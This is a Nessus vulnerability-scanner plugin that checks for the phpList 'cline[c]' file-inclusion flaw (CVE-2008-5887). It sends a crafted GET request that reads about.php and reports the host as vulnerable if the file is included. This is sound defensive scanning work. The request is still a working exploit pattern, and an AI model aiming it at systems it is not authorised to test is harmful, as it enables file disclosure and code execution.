#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(35259);
  script_version("$Revision: 1.13 $");
  script_cvs_date("$Date: 2016/05/16 14:22:06 $");

  script_cve_id("CVE-2008-5887");
  script_bugtraq_id(32841);
  script_osvdb_id(50747);
  script_xref(name:"Secunia", value:"33186");

  script_name(english:"phpList cline Parameter Array Remote File Inclusion");
  script_summary(english:"Tries to read a local file");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is susceptible
to a remote file include attack.");
  script_set_attribute(attribute:"description", value:
"The version of phpList installed on the remote host fails to filter
user input to the 'cline[c]' parameter before passing it to a PHP
'include()' function in 'admin/index.php'.  Regardless of PHP's
'register_globals' setting, an unauthenticated attacker can exploit
this issue to view arbitrary files on the remote host or to execute
arbitrary PHP code, possibly taken from third-party hosts.");
  script_set_attribute(attribute:"see_also", value:"http://www.phplist.com/?lid=273");
  script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/499218");
  script_set_attribute(attribute:"solution", value:
"Upgrade to phpList version 2.10.8 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"phpList 2.10.7 LFI");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
  script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
  script_set_attribute(attribute:"canvas_package", value:'CANVAS');
  script_cwe_id(20);

  script_set_attribute(attribute:"plugin_publication_date", value:"2008/12/22");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:tincan:phplist");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2016 Tenable Network Security, Inc.");

  script_dependencies("phplist_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/phplist");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80, php:TRUE);


# Test an install.
install = get_kb_item(string("www/", port, "/phplist"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # Try to exploit the issue to read a file.
  file = "about.php";
  url = string(dir, "/admin/index.php?cline[c]=", file);

  res = http_send_recv3(method:"GET", item:url, port:port);
  if (res == NULL) exit(0);

  # There's a problem if...
  if (
    string('<!-- using ', file, ' -->') >< res[2] &&
    (
      'class="abouthead">NAME</td>' >< res[2] ||
      'phplist</a>, version VERSION' >< res[2]
    )
  )
  {
    if (report_verbosity > 0)
    {
      report = string(
        "\n",
        "Nessus was able to verify the issue exists using the following \n",
        "request :\n",
        "\n",
        "  ", build_url(port:port, qs:url), "\n"
      );
      security_hole(port:port, extra:report);
    }
    else security_hole(port);

    exit(0);
  }
}
